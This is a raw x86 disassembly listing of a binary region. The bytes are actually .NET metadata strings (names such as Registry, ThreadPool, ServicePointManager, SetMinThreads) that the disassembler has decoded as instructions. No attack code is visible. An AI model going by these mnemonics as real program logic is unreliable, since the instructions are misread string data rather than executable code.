  409fdb:	outs   dx,BYTE PTR gs:[esi]
  409fdd:	fs gs jb 0x409fe1
  409fe1:	jbe    0x40a04c
  409fe3:	jb     0x40a059
  409fe5:	inc    esi
  409fe6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x74726976
  409fee:	jne    0x40a051
  409ff0:	ins    BYTE PTR es:[edi],dx
  409ff1:	inc    esp
  409ff2:	imul   esi,DWORD PTR [edx+0x0],0x65736162
  409ff9:	push   eax
  409ffa:	popa   
  409ffb:	je     0x40a065
  409ffd:	add    BYTE PTR [edx+0x65],dh
  40a000:	ins    BYTE PTR es:[edi],dx
  40a001:	popa   
  40a002:	je     0x40a06d
  40a004:	jbe    0x40a06b
  40a006:	push   eax
  40a007:	popa   
  40a008:	je     0x40a072
  40a00a:	add    BYTE PTR [esi+0x69],dh
  40a00d:	jb     0x40a083
  40a00f:	jne    0x40a072
  40a011:	ins    BYTE PTR es:[edi],dx
  40a012:	push   eax
  40a013:	popa   
  40a014:	je     0x40a07e
  40a016:	dec    ecx
  40a017:	je     0x40a07e
  40a019:	ins    DWORD PTR es:[edi],dx
  40a01a:	dec    ecx
  40a01b:	outs   dx,BYTE PTR ds:[esi]
  40a01c:	outs   dx,WORD PTR ds:[esi]
  40a01e:	add    BYTE PTR [ecx+eiz*2+0x72],dl
  40a022:	addr16 gs je 0x40a06c
  40a026:	jb     0x40a089
  40a028:	ins    DWORD PTR es:[edi],dx
  40a029:	gs ja  0x40a09b
  40a02c:	jb     0x40a099
  40a02e:	inc    ecx
  40a02f:	je     0x40a0a5
  40a031:	jb     0x40a09c
  40a033:	bound  esi,QWORD PTR [ebp+0x74]
  40a036:	add    BYTE PTR gs:[ebx+0x6f],al
  40a03a:	ins    DWORD PTR es:[edi],dx
  40a03b:	push   esi
  40a03c:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  40a043:	je     0x40a0b9
  40a045:	jb     0x40a0b0
  40a047:	bound  esi,QWORD PTR [ebp+0x74]
  40a04a:	add    BYTE PTR gs:[ebx+0x4c],al
  40a04e:	push   ebx
  40a04f:	inc    ebx
  40a050:	outs   dx,DWORD PTR ds:[esi]
  40a051:	ins    DWORD PTR es:[edi],dx
  40a052:	jo     0x40a0c0
  40a054:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  40a05b:	jb     0x40a0c6
  40a05d:	bound  esi,QWORD PTR [ebp+0x74]
  40a060:	add    BYTE PTR gs:[ecx+0x73],al
  40a064:	jae    0x40a0cb
  40a066:	ins    DWORD PTR es:[edi],dx
  40a067:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  40a06b:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  40a073:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a07a:	jae    0x40a0ef
  40a07c:	gs ins DWORD PTR es:[edi],dx
  40a07e:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40a082:	gs jae 0x40a0e8
  40a085:	jb     0x40a0f0
  40a087:	jo     0x40a0fd
  40a089:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a090:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a097:	jae    0x40a10c
  40a099:	gs ins DWORD PTR es:[edi],dx
  40a09b:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40a09f:	gs popaw 
  40a0a2:	jne    0x40a110
  40a0a4:	je     0x40a0e7
  40a0a6:	ins    BYTE PTR es:[edi],dx
  40a0a7:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40a0ae:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a0b5:	jae    0x40a12a
  40a0b7:	gs ins DWORD PTR es:[edi],dx
  40a0b9:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40a0bd:	outs   dx,DWORD PTR ds:[esi]
  40a0be:	ins    DWORD PTR es:[edi],dx
  40a0bf:	jo     0x40a122
  40a0c1:	outs   dx,BYTE PTR ds:[esi]
  40a0c2:	jns    0x40a105
  40a0c4:	je     0x40a13a
  40a0c6:	jb     0x40a131
  40a0c8:	bound  esi,QWORD PTR [ebp+0x74]
  40a0cb:	add    BYTE PTR gs:[ecx+0x73],al
  40a0cf:	jae    0x40a136
  40a0d1:	ins    DWORD PTR es:[edi],dx
  40a0d2:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  40a0d6:	jb     0x40a147
  40a0d8:	fs jne 0x40a13e
  40a0db:	je     0x40a11e
  40a0dd:	je     0x40a153
  40a0df:	jb     0x40a14a
  40a0e1:	bound  esi,QWORD PTR [ebp+0x74]
  40a0e4:	add    BYTE PTR gs:[ecx+0x73],al
  40a0e8:	jae    0x40a14f
  40a0ea:	ins    DWORD PTR es:[edi],dx
  40a0eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40a0ef:	outs   dx,DWORD PTR ds:[esi]
  40a0f0:	jo     0x40a16b
  40a0f2:	jb     0x40a15d
  40a0f4:	addr16 push 0x74744174
  40a0fa:	jb     0x40a165
  40a0fc:	bound  esi,QWORD PTR [ebp+0x74]
  40a0ff:	add    BYTE PTR gs:[ecx+0x73],al
  40a103:	jae    0x40a16a
  40a105:	ins    DWORD PTR es:[edi],dx
  40a106:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40a10a:	gs jb  0x40a180
  40a10d:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a114:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a11b:	jae    0x40a190
  40a11d:	gs ins DWORD PTR es:[edi],dx
  40a11f:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  40a123:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  40a12b:	outs   dx,DWORD PTR ds:[esi]
  40a12c:	outs   dx,BYTE PTR ds:[esi]
  40a12d:	inc    ecx
  40a12e:	je     0x40a1a4
  40a130:	jb     0x40a19b
  40a132:	bound  esi,QWORD PTR [ebp+0x74]
  40a135:	add    BYTE PTR gs:[ecx+0x73],al
  40a139:	jae    0x40a1a0
  40a13b:	ins    DWORD PTR es:[edi],dx
  40a13c:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a140:	outs   dx,BYTE PTR ds:[esi]
  40a141:	outs   dx,WORD PTR ds:[esi]
  40a143:	jb     0x40a1b2
  40a145:	popa   
  40a146:	je     0x40a1b1
  40a148:	outs   dx,DWORD PTR ds:[esi]
  40a149:	outs   dx,BYTE PTR ds:[esi]
  40a14a:	popa   
  40a14b:	ins    BYTE PTR es:[edi],dx
  40a14c:	push   esi
  40a14d:	gs jb  0x40a1c3
  40a150:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a157:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  40a15e:	jns    0x40a1d3
  40a160:	je     0x40a1c7
  40a162:	ins    DWORD PTR es:[edi],dx
  40a163:	cs push edx
  40a165:	gs jae 0x40a1d7
  40a168:	jne    0x40a1dc
  40a16a:	arpl   WORD PTR [ebp+0x73],sp
  40a16d:	add    BYTE PTR [ebx+0x61],dl
  40a170:	je     0x40a1d7
  40a172:	ins    BYTE PTR es:[edi],dx
  40a173:	ins    BYTE PTR es:[edi],dx
  40a174:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  40a17c:	popa   
  40a17d:	arpl   WORD PTR [esi+edx*2+0x65],si
  40a181:	jb     0x40a1f6
  40a183:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40a18a:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  40a191:	gs jne 0x40a208
  40a194:	jb     0x40a1f7
  40a196:	ins    BYTE PTR es:[edi],dx
  40a197:	push   edx
  40a198:	gs jae 0x40a20a
  40a19b:	jne    0x40a20f
  40a19d:	arpl   WORD PTR [ebp+0x73],sp
  40a1a0:	dec    esp
  40a1a1:	popa   
  40a1a2:	outs   dx,BYTE PTR ds:[esi]
  40a1a3:	addr16 jne 0x40a207
  40a1a6:	addr16 gs inc ecx
  40a1a9:	je     0x40a21f
  40a1ab:	jb     0x40a216
  40a1ad:	bound  esi,QWORD PTR [ebp+0x74]
  40a1b0:	add    BYTE PTR gs:[ecx+0x73],al
  40a1b4:	jae    0x40a21b
  40a1b6:	ins    DWORD PTR es:[edi],dx
  40a1b7:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40a1bb:	gs ins BYTE PTR es:[edi],dx
  40a1bd:	popa   
  40a1be:	jns    0x40a213
  40a1c0:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  40a1c7:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40a1ce:	jae    0x40a243
  40a1d0:	gs ins DWORD PTR es:[edi],dx
  40a1d2:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  40a1d6:	gs jns 0x40a21f
  40a1d9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  40a1e1:	bound  esi,QWORD PTR [ebp+0x74]
  40a1e4:	add    BYTE PTR gs:[ecx+0x73],al
  40a1e8:	jae    0x40a24f
  40a1ea:	ins    DWORD PTR es:[edi],dx
  40a1eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  40a1ef:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  40a1f6:	gs dec ebx
  40a1f8:	gs jns 0x40a23c
  40a1fb:	je     0x40a271
  40a1fd:	jb     0x40a268
  40a1ff:	bound  esi,QWORD PTR [ebp+0x74]
  40a202:	add    BYTE PTR gs:[ebx+0x79],dl
  40a206:	jae    0x40a27c
  40a208:	gs ins DWORD PTR es:[edi],dx
  40a20a:	cs push edx
  40a20c:	jne    0x40a27c
  40a20e:	je     0x40a279
  40a210:	ins    DWORD PTR es:[edi],dx
  40a211:	gs cs inc ebx
  40a214:	outs   dx,DWORD PTR ds:[esi]
  40a215:	ins    DWORD PTR es:[edi],dx
  40a216:	jo     0x40a281
  40a218:	ins    BYTE PTR es:[edi],dx
  40a219:	gs jb  0x40a26f
  40a21c:	gs jb  0x40a295
  40a21f:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  40a226:	outs   dx,BYTE PTR ds:[esi]
  40a227:	je     0x40a292
  40a229:	ins    DWORD PTR es:[edi],dx
  40a22a:	gs inc ebx
  40a22c:	outs   dx,DWORD PTR ds:[esi]
  40a22d:	ins    DWORD PTR es:[edi],dx
  40a22e:	jo     0x40a291
  40a230:	je     0x40a29b
  40a232:	bound  ebp,QWORD PTR [ecx+0x6c]
  40a235:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  40a23d:	bound  esi,QWORD PTR [ebp+0x74]
  40a240:	add    BYTE PTR gs:[ebx+0x79],dl
  40a244:	jae    0x40a2ba
  40a246:	gs ins DWORD PTR es:[edi],dx
  40a248:	cs inc esp
  40a24a:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  40a251:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  40a258:	jne    0x40a2c1
  40a25a:	addr16 popa 
  40a25c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40a260:	je     0x40a2d6
  40a262:	jb     0x40a2cd
  40a264:	bound  esi,QWORD PTR [ebp+0x74]
  40a267:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40a26c:	jne    0x40a2d5
  40a26e:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  40a276:	jae    0x40a278
  40a278:	inc    ebx
  40a279:	outs   dx,DWORD PTR ds:[esi]
  40a27a:	ins    DWORD PTR es:[edi],dx
  40a27b:	jo     0x40a2e6
  40a27d:	ins    BYTE PTR es:[edi],dx
  40a27e:	popa   
  40a27f:	je     0x40a2ea
  40a281:	outs   dx,DWORD PTR ds:[esi]
  40a282:	outs   dx,BYTE PTR ds:[esi]
  40a283:	push   edx
  40a284:	gs ins BYTE PTR es:[edi],dx
  40a286:	popa   
  40a287:	js     0x40a2ea
  40a289:	je     0x40a2f4
  40a28b:	outs   dx,DWORD PTR ds:[esi]
  40a28c:	outs   dx,BYTE PTR ds:[esi]
  40a28d:	jae    0x40a2d0
  40a28f:	je     0x40a305
  40a291:	jb     0x40a2fc
  40a293:	bound  esi,QWORD PTR [ebp+0x74]
  40a296:	add    BYTE PTR gs:[ebx+0x6f],al
  40a29a:	ins    DWORD PTR es:[edi],dx
  40a29b:	jo     0x40a306
  40a29d:	ins    BYTE PTR es:[edi],dx
  40a29e:	gs jb  0x40a2e8
  40a2a1:	outs   dx,BYTE PTR gs:[esi]
  40a2a3:	gs jb  0x40a307
  40a2a6:	je     0x40a30d
  40a2a8:	fs inc ecx
  40a2aa:	je     0x40a320
  40a2ac:	jb     0x40a317
  40a2ae:	bound  esi,QWORD PTR [ebp+0x74]
  40a2b1:	add    BYTE PTR gs:[ebx+0x54],dl
  40a2b5:	inc    ecx
  40a2b6:	push   esp
  40a2b7:	push   0x64616572
  40a2bc:	inc    ecx
  40a2bd:	je     0x40a333
  40a2bf:	jb     0x40a32a
  40a2c1:	bound  esi,QWORD PTR [ebp+0x74]
  40a2c4:	add    BYTE PTR gs:[edi+ebp*2+0x61],cl
  40a2c9:	fs gs jb 0x40a31c
  40a2cd:	jo     0x40a343
  40a2cf:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  40a2d6:	outs   dx,DWORD PTR ds:[esi]
  40a2d7:	outs   dx,BYTE PTR ds:[esi]
  40a2d8:	inc    ecx
  40a2d9:	je     0x40a34f
  40a2db:	jb     0x40a346
  40a2dd:	bound  esi,QWORD PTR [ebp+0x74]
  40a2e0:	add    BYTE PTR gs:[edi+ebp*2+0x61],cl
  40a2e5:	fs gs jb 0x40a338
  40a2e9:	jo     0x40a35f
  40a2eb:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  40a2f2:	outs   dx,DWORD PTR ds:[esi]
  40a2f3:	outs   dx,BYTE PTR ds:[esi]
  40a2f4:	add    BYTE PTR [ecx*2+0x3e6e6961],bh
  40a2fb:	bound  ebx,QWORD PTR [edi+0x5f]
  40a2fe:	xor    BYTE PTR [eax],al
  40a300:	gs jbe 0x40a368
  40a303:	outs   dx,BYTE PTR ds:[esi]
  40a304:	je     0x40a347
  40a306:	jb     0x40a36f
  40a308:	jae    0x40a30a
  40a30a:	inc    ebp
  40a30b:	jbe    0x40a372
  40a30d:	outs   dx,BYTE PTR ds:[esi]
  40a30e:	je     0x40a358
  40a310:	popa   
  40a311:	outs   dx,BYTE PTR ds:[esi]
  40a312:	fs ins BYTE PTR es:[edi],dx
  40a314:	gs jb  0x40a317
  40a317:	inc    ebx
  40a318:	push   ebx
  40a319:	and    al,0x3c
  40a31b:	cmp    DWORD PTR ds:[edi+0x5f],ebx
  40a31f:	inc    ebx
  40a320:	popa   
  40a321:	arpl   WORD PTR [eax+0x65],bp
  40a324:	fs inc ecx
  40a326:	outs   dx,BYTE PTR ds:[esi]
  40a327:	outs   dx,DWORD PTR ds:[esi]
  40a328:	outs   dx,BYTE PTR ds:[esi]
  40a329:	jns    0x40a398
  40a32b:	outs   dx,DWORD PTR ds:[esi]
  40a32c:	jne    0x40a3a1
  40a32e:	dec    ebp
  40a32f:	gs je  0x40a39a
  40a332:	outs   dx,DWORD PTR ds:[esi]
  40a333:	fs inc esp
  40a335:	gs ins BYTE PTR es:[edi],dx
  40a337:	gs addr16 popa 
  40a33a:	je     0x40a3a1
  40a33c:	xor    DWORD PTR [eax],eax
  40a33e:	push   ebx
  40a33f:	gs je  0x40a342
  40a342:	push   ebx
  40a343:	je     0x40a3b7
  40a345:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  40a34c:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  40a353:	popa   
  40a354:	jb     0x40a3bf
  40a356:	jae    0x40a3c7
  40a358:	outs   dx,BYTE PTR ds:[esi]
  40a359:	add    BYTE PTR [ebx+0x74],dl
  40a35c:	popa   
  40a35d:	jb     0x40a3d3
  40a35f:	jae    0x40a3b8
  40a361:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x69727453
  40a369:	outs   dx,BYTE PTR ds:[esi]
  40a36a:	addr16 inc ebx
  40a36c:	outs   dx,DWORD PTR ds:[esi]
  40a36d:	ins    DWORD PTR es:[edi],dx
  40a36e:	jo     0x40a3d1
  40a370:	jb     0x40a3d7
  40a372:	jb     0x40a374
  40a374:	addr16 gs je 0x40a3d7
  40a378:	dec    edi
  40a379:	jb     0x40a3df
  40a37b:	imul   ebp,DWORD PTR [esi+0x61],0x6e67496c
  40a382:	outs   dx,DWORD PTR ds:[esi]
  40a383:	jb     0x40a3ea
  40a385:	inc    ebx
  40a386:	popa   
  40a387:	jae    0x40a3ee
  40a389:	add    BYTE PTR [edx+0x6f],al
  40a38c:	outs   dx,DWORD PTR ds:[esi]
  40a38d:	ins    BYTE PTR es:[edi],dx
  40a38e:	gs popa 
  40a390:	outs   dx,BYTE PTR ds:[esi]
  40a391:	add    BYTE PTR [edx+esi*2+0x75],dl
  40a395:	gs push ebx
  40a397:	je     0x40a40b
  40a399:	imul   ebp,DWORD PTR [esi+0x67],0x6e6f4300
  40a3a0:	arpl   WORD PTR [ecx+0x74],sp
  40a3a3:	add    BYTE PTR [ebp+0x71],al
  40a3a6:	jne    0x40a409
  40a3a8:	ins    BYTE PTR es:[edi],dx
  40a3a9:	jae    0x40a3ab
  40a3ab:	inc    esp
  40a3ac:	bound  esi,QWORD PTR gs:[ebp+0x67]
  40a3b0:	addr16 gs jb 0x40a3b4
  40a3b4:	inc    edx
  40a3b5:	jb     0x40a41c
  40a3b7:	popa   
  40a3b8:	imul   eax,DWORD PTR [eax],0x67
  40a3bb:	gs je  0x40a41d
  40a3be:	dec    esp
  40a3bf:	outs   dx,BYTE PTR gs:[esi]
  40a3c1:	addr16 je 0x40a42c
  40a3c4:	add    BYTE PTR [edx+0x65],dl
  40a3c7:	ins    DWORD PTR es:[edi],dx
  40a3c8:	outs   dx,DWORD PTR ds:[esi]
  40a3c9:	jbe    0x40a430
  40a3cb:	add    BYTE PTR [esi+0x65],cl
  40a3ce:	je     0x40a41e
  40a3d0:	popa   
  40a3d1:	ins    DWORD PTR es:[edi],dx
  40a3d2:	gs fs push eax
  40a3d5:	imul   esi,DWORD PTR [eax+0x65],0x75636553
  40a3dc:	jb     0x40a447
  40a3de:	je     0x40a459
  40a3e0:	dec    ebp
  40a3e1:	outs   dx,DWORD PTR ds:[esi]
  40a3e2:	fs add BYTE PTR gs:[ebp+0x61],cl
  40a3e7:	js     0x40a43f
  40a3e9:	popa   
  40a3ea:	ins    BYTE PTR es:[edi],dx
  40a3eb:	jne    0x40a452
  40a3ed:	add    BYTE PTR [edx+0x69],al
  40a3f0:	outs   dx,BYTE PTR ds:[esi]
  40a3f1:	imul   ebp,DWORD PTR fs:[esi+0x67],0x74657300
  40a3f9:	pop    edi
  40a3fa:	push   edx
  40a3fb:	arpl   WORD PTR gs:[ebp+0x69],sp
  40a3ff:	jbe    0x40a466
  40a401:	push   esp
  40a402:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  40a409:	jae    0x40a470
  40a40b:	je     0x40a46c
  40a40d:	dec    ebp
  40a40e:	popa   
  40a40f:	js     0x40a463
  40a411:	arpl   WORD PTR gs:[ebp+0x69],sp
  40a415:	jbe    0x40a47c
  40a417:	fs dec ebp
  40a419:	gs jae 0x40a48f
  40a41c:	popa   
  40a41d:	addr16 gs push ebx
  40a420:	imul   edi,DWORD PTR [edx+0x65],0x73795300
  40a427:	je     0x40a48e
  40a429:	ins    DWORD PTR es:[edi],dx
  40a42a:	cs push edx
  40a42c:	jne    0x40a49c
  40a42e:	je     0x40a499
  40a430:	ins    DWORD PTR es:[edi],dx
  40a431:	gs cs push ebx
  40a434:	gs jb  0x40a4a0
  40a437:	popa   
  40a438:	ins    BYTE PTR es:[edi],dx
  40a439:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  40a440:	add    BYTE PTR [ebx+0x79],dl
  40a443:	jae    0x40a4b9
  40a445:	gs ins DWORD PTR es:[edi],dx
  40a447:	cs pop eax
  40a449:	ins    DWORD PTR es:[edi],dx
  40a44a:	ins    BYTE PTR es:[edi],dx
  40a44b:	add    BYTE PTR [eax+0x6d],bl
  40a44e:	ins    BYTE PTR es:[edi],dx
  40a44f:	inc    esp
  40a450:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  40a457:	jb     0x40a4d2
  40a459:	push   edx
  40a45a:	gs popa 
  40a45c:	fs gs jb 0x40a4b1
  40a460:	jne    0x40a4d1
  40a462:	je     0x40a4c5
  40a464:	jae    0x40a466
  40a466:	addr16 gs je 0x40a4c9
  40a46a:	push   edx
  40a46b:	gs popa 
  40a46d:	fs gs jb 0x40a4c2
  40a471:	jne    0x40a4e2
  40a473:	je     0x40a4d6
  40a475:	jae    0x40a477
  40a477:	jae    0x40a4de
  40a479:	je     0x40a4da
  40a47b:	dec    ebp
  40a47c:	popa   
  40a47d:	js     0x40a4d2
  40a47f:	je     0x40a4f3
  40a481:	imul   ebp,DWORD PTR [esi+0x67],0x746e6f43
  40a488:	outs   dx,BYTE PTR gs:[esi]
  40a48a:	je     0x40a4d8
  40a48c:	outs   dx,BYTE PTR gs:[esi]
  40a48e:	addr16 je 0x40a4f9
  40a491:	add    BYTE PTR [esi+0x65],cl
  40a494:	je     0x40a4e4
  40a496:	popa   
  40a497:	ins    DWORD PTR es:[edi],dx
  40a498:	gs fs push eax
  40a49b:	imul   esi,DWORD PTR [eax+0x65],0x75636553
  40a4a2:	jb     0x40a50d
  40a4a4:	je     0x40a51f
  40a4a6:	add    BYTE PTR [edi+0x65],ah
  40a4a9:	je     0x40a50a
  40a4ab:	push   ebx
  40a4ac:	arpl   WORD PTR gs:[ebp+0x72],si
  40a4b0:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x656d614e
  40a4b8:	fs push eax
  40a4ba:	imul   esi,DWORD PTR [eax+0x65],0x6e617254
  40a4c1:	jae    0x40a533
  40a4c3:	outs   dx,DWORD PTR ds:[esi]
  40a4c4:	jb     0x40a53a
  40a4c6:	push   ebx
  40a4c7:	arpl   WORD PTR gs:[ebp+0x72],si
  40a4cb:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746567
  40a4d3:	push   esp
  40a4d4:	jb     0x40a537
  40a4d6:	outs   dx,BYTE PTR ds:[esi]
  40a4d7:	jae    0x40a549
  40a4d9:	outs   dx,DWORD PTR ds:[esi]
  40a4da:	jb     0x40a550
  40a4dc:	add    BYTE PTR [ebx+0x79],dl
  40a4df:	jae    0x40a555
  40a4e1:	gs ins DWORD PTR es:[edi],dx
  40a4e3:	cs dec esi
  40a4e5:	gs je  0x40a516
  40a4e8:	push   ebx
  40a4e9:	arpl   WORD PTR gs:[ebp+0x72],si
  40a4ed:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x746f7250
  40a4f5:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a4fa:	outs   dx,BYTE PTR ds:[esi]
  40a4fb:	dec    esp
  40a4fc:	gs jbe 0x40a564
  40a4ff:	ins    BYTE PTR es:[edi],dx
  40a500:	add    BYTE PTR [ebx+0x65],dh
  40a503:	je     0x40a564
  40a505:	push   eax
  40a506:	jb     0x40a577
  40a508:	je     0x40a56f
  40a50a:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40a50e:	outs   dx,BYTE PTR ds:[esi]
  40a50f:	dec    esp
  40a510:	gs jbe 0x40a578
  40a513:	ins    BYTE PTR es:[edi],dx
  40a514:	add    BYTE PTR [ebp+0x76],al
  40a517:	outs   dx,BYTE PTR gs:[esi]
  40a519:	je     0x40a56d
  40a51b:	gs jae 0x40a583
  40a51e:	je     0x40a56d
  40a520:	outs   dx,DWORD PTR ds:[esi]
  40a521:	fs add BYTE PTR gs:[edi+0x61],dl
  40a526:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  40a52e:	add    BYTE PTR [ebx+0x6c],al
  40a531:	outs   dx,DWORD PTR ds:[esi]
  40a532:	jae    0x40a599
  40a534:	add    BYTE PTR [ebx+0x79],dl
  40a537:	jae    0x40a5ad
  40a539:	gs ins DWORD PTR es:[edi],dx
  40a53b:	cs inc edi
  40a53d:	ins    BYTE PTR es:[edi],dx
  40a53e:	outs   dx,DWORD PTR ds:[esi]
  40a53f:	bound  esp,QWORD PTR [ecx+0x6c]
  40a542:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  40a549:	add    BYTE PTR [ebx+0x75],al
  40a54c:	ins    BYTE PTR es:[edi],dx
  40a54d:	je     0x40a5c4
  40a54f:	jb     0x40a5b6
  40a551:	dec    ecx
  40a552:	outs   dx,BYTE PTR ds:[esi]
  40a553:	outs   dx,WORD PTR ds:[esi]
  40a555:	add    BYTE PTR [edi+0x65],ah
  40a558:	je     0x40a5b9
  40a55a:	dec    ecx
  40a55b:	outs   dx,BYTE PTR ds:[esi]
  40a55c:	jbe    0x40a5bf
  40a55e:	jb     0x40a5c9
  40a560:	popa   
  40a561:	outs   dx,BYTE PTR ds:[esi]
  40a562:	je     0x40a5a7
  40a564:	jne    0x40a5d2
  40a566:	je     0x40a5dd
  40a568:	jb     0x40a5cf
  40a56a:	add    BYTE PTR [ebx+0x6f],al
  40a56d:	outs   dx,BYTE PTR ds:[esi]
  40a56e:	jbe    0x40a5d5
  40a570:	jb     0x40a5e6
  40a572:	add    BYTE PTR [ecx+0x46],cl
  40a575:	outs   dx,DWORD PTR ds:[esi]
  40a576:	jb     0x40a5e5
  40a578:	popa   
  40a579:	je     0x40a5cb
  40a57b:	jb     0x40a5ec
  40a57d:	jbe    0x40a5e8
  40a57f:	fs gs jb 0x40a583
  40a583:	push   esp
  40a584:	outs   dx,DWORD PTR ds:[esi]
  40a585:	dec    ecx
  40a586:	outs   dx,BYTE PTR ds:[esi]
  40a587:	je     0x40a5bc
  40a589:	xor    al,BYTE PTR [eax]
  40a58b:	push   eax
  40a58c:	jb     0x40a5fd
  40a58e:	arpl   WORD PTR [ebp+0x73],sp
  40a591:	jae    0x40a593
  40a593:	inc    edi
  40a594:	gs je  0x40a5e7
  40a597:	jb     0x40a608
  40a599:	arpl   WORD PTR [ebp+0x73],sp
  40a59c:	jae    0x40a5e0
  40a59e:	jns    0x40a5e9
  40a5a0:	add    BYTE PTR fs:[ebx+0x65],dh
  40a5a4:	je     0x40a605
  40a5a6:	inc    ebp
  40a5a7:	outs   dx,BYTE PTR ds:[esi]
  40a5a8:	popa   
  40a5a9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
  40a5ad:	popa   
  40a5ae:	imul   esi,DWORD PTR [ebx+0x69],0x7645676e
  40a5b5:	outs   dx,BYTE PTR gs:[esi]
  40a5b7:	je     0x40a62c
  40a5b9:	add    BYTE PTR [ecx+0x64],ah
  40a5bc:	fs pop edi
  40a5be:	inc    ebp
  40a5bf:	js     0x40a62a
  40a5c1:	je     0x40a628
  40a5c3:	add    BYTE PTR fs:[edi+0x61],dl
  40a5c7:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x6f430065
  40a5cf:	ins    DWORD PTR es:[edi],dx
  40a5d0:	ins    DWORD PTR es:[edi],dx
  40a5d1:	jne    0x40a641
  40a5d3:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a5da:	dec    edi
  40a5db:	bound  ebp,QWORD PTR [edx+0x65]
  40a5de:	arpl   WORD PTR [eax+eax*1+0x45],si
  40a5e2:	outs   dx,BYTE PTR ds:[esi]
  40a5e3:	jbe    0x40a64e
  40a5e5:	jb     0x40a656
  40a5e7:	outs   dx,BYTE PTR ds:[esi]
  40a5e8:	ins    DWORD PTR es:[edi],dx
  40a5e9:	outs   dx,BYTE PTR gs:[esi]
  40a5eb:	je     0x40a5ed
  40a5ed:	inc    ebp
  40a5ee:	js     0x40a659
  40a5f0:	je     0x40a5f2
  40a5f2:	dec    ebp
  40a5f3:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a5fa:	je     0x40a62a
  40a5fc:	push   edi
  40a5fd:	imul   ebp,DWORD PTR [esi+0x33],0x65520032
  40a604:	imul   esi,DWORD PTR [bp+di+0x74],0x52007972
  40a60c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x654b7972
  40a615:	jns    0x40a617
  40a617:	inc    ebx
  40a618:	jne    0x40a68c
  40a61a:	jb     0x40a681
  40a61c:	outs   dx,BYTE PTR ds:[esi]
  40a61d:	je     0x40a674
  40a61f:	jae    0x40a686
  40a621:	jb     0x40a623
  40a623:	dec    edi
  40a624:	jo     0x40a68b
  40a626:	outs   dx,BYTE PTR ds:[esi]
  40a627:	push   ebx
  40a628:	jne    0x40a68c
  40a62a:	dec    ebx
  40a62b:	gs jns 0x40a62e
  40a62e:	inc    edi
  40a62f:	gs je  0x40a688
  40a632:	popa   
  40a633:	ins    BYTE PTR es:[edi],dx
  40a634:	jne    0x40a69b
  40a636:	add    BYTE PTR [ecx+0x6e],cl
  40a639:	je     0x40a66e
  40a63b:	xor    al,BYTE PTR [eax]
  40a63d:	push   esp
  40a63e:	push   0x64616572
  40a643:	add    BYTE PTR [ebx+0x6c],dl
  40a646:	gs gs jo 0x40a64a
  40a64a:	push   esp
  40a64b:	push   0x64616572
  40a650:	push   eax
  40a651:	outs   dx,DWORD PTR ds:[esi]
  40a652:	outs   dx,DWORD PTR ds:[esi]
  40a653:	ins    BYTE PTR es:[edi],dx
  40a654:	add    BYTE PTR [edi+0x65],al
  40a657:	je     0x40a6a6
  40a659:	imul   ebp,DWORD PTR [esi+0x54],0x61657268
  40a660:	fs jae 0x40a663
  40a663:	push   ebx
  40a664:	gs je  0x40a6b4
  40a667:	imul   ebp,DWORD PTR [esi+0x54],0x61657268
